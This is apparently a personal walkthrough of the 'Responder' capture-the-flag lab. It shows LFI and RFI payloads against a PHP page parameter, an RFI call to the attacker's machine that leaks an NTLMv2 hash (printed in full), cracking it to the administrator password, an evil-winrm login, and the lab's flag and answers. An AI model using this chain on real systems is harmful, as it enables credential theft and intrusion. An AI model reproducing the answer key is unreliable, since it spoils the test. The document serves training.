# Responder

> IP: [10.129.98.173]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.98.173 -oN init_scan
      1. Port 80 -> http -> Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
3. HTTP
   1. Navigate to website
      1. Redirected to unika.htb
         1. Need to add this to our /etc/hosts file to be able to view
   2. SOURCE CODE
      1. Language -> index.php?page=LANGUAGE
4. EXPLOIT
   1. LFI
      1. page=../../../../../windows/system32/drivers/etc/hosts
         1. In here we get the standard output of the windows hosts file
   2. RFI
      1. page=//MY_IP_ADDR/file
         1. We can use responder to set up a simple server and then use RFI to have the victim machine make a call out to our attack machine
         2. Using a test file like revshell.php we get the error

            ```text
               Warning: include(\\MY_IP\REVSHELL.PHP): Failed to open stream: Permission denied in C:\xampp\htdocs\index.php on line 11
               Warning: include(): Failed opening '//MY_IP/revshell.php' for inclusion (include_path='\xampp\php\PEAR') in C:\xampp\htdocs\index.php on line 11
            ```

            1. This tells me the machine is using XAMPP as its hosting software
5. RESPONDER
   1. > responder -h
      1. Interface = "-I"
   2. Need to have responder listening on our tun0 interface
      1. > responder -I tun0
      2. Now use our RFI attack
         1. page=//MY_IP_ADDR/revshell.php (however it doens't have to be revshell it could be anything, we are just looking for the callback to responder)
         2. RESPONSE

            ```text
               [SMB] NTLMv2-SSP Client   : 10.129.98.173
               [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
               [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:587500a5e8a7d396:A57C9BB7FCC002904F166CFCF03FD035:010100000000000000DDB764A859DA015D3570B2C9D5DEA5000000000200080036005A004800470001001E00570049004E002D004D00580038004A00320056003400540034003800350004003400570049004E002D004D00580038004A0032005600340054003400380035002E0036005A00480047002E004C004F00430041004C000300140036005A00480047002E004C004F00430041004C000500140036005A00480047002E004C004F00430041004C000700080000DDB764A859DA0106000400020000000800300030000000000000000100000000200000806EFD2F686D8251487246A01CB2C5B61C3880BD8B83E34728CDB382EAA906CF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200330030000000000000000000
            ```

            1. Now we have a username and a hashed password
6. CRACK THE HASH
   1. Save our hash output as a file
      1. > echo 'Administrator::RESPONDER:587500a5e8a7d396:A57C9BB7FCC002904F166CFCF03FD035:010100000000000000DDB764A859DA015D3570B2C9D5DEA5000000000200080036005A004800470001001E00570049004E002D004D00580038004A00320056003400540034003800350004003400570049004E002D004D00580038004A0032005600340054003400380035002E0036005A00480047002E004C004F00430041004C000300140036005A00480047002E004C004F00430041004C000500140036005A00480047002E004C004F00430041004C000700080000DDB764A859DA0106000400020000000800300030000000000000000100000000200000806EFD2F686D8251487246A01CB2C5B61C3880BD8B83E34728CDB382EAA906CF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200330030000000000000000000' > hashes.txt
   2. Now run John-The-Ripper to try and crack the hash - we know this is a windows machine so it is NTLM
      1. > john ./hashes.txt --wordlist=/opt/rockyou.txt
         1. RESPONSE: `badminton (Administrator)`
         2. Now we have a username and password but we don't have a service to login to so lets try rerunning our NMAP scan and do a full -p- to see if there is a port we missed
7. NMAP Pt.2
   1. > nmap -T5 -p- 10.129.98.173
      1. Port 80 -> http
      2. Port 5985 -> winrm -> http -> Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8. HTTP
   1. Navigate to that new port we discovered
      1. We get a 404 error
9. RESEARCH
   1. Doing some googling we see that port 5985 on a windows machine is prone to WinRM attack
   2. So lets use the EVIL WINRM tool
10. WINRM
   1. > evil-winrm -i 10.129.98.173 -u Administrator -p 'badminton'
   2. SUCCESS! We now have rce lets look for the root flag
   3. Looking around I found the flag in
      1. C:\Users\mike\Desktop\flag.txt
         1. FLAG: `ea81b7afddd03efaa0945333ed147fac`

## QUESTIONS

1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
   1. `http://unika.htb/`
2. Which scripting language is being used on the server to generate webpages?
   1. `PHP`
3. What is the name of the URL parameter which is used to load different language versions of the webpage?
   1. `page`
4. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
   1. `../../../../../../../../windows/system32/drivers/etc/hosts`
5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
   1. `//10.10.14.6/somefile`
6. What does NTLM stand for?
   1. `new technology LAN manager`
7. Which flag do we use in the Responder utility to specify the network interface?
   1. `-I`
8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
   1. `john the ripper`
9. What is the password for the administrator user?
   1. `badminton`
10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
    1. `5985`
11. Submit root flag
    1. `ea81b7afddd03efaa0945333ed147fac`
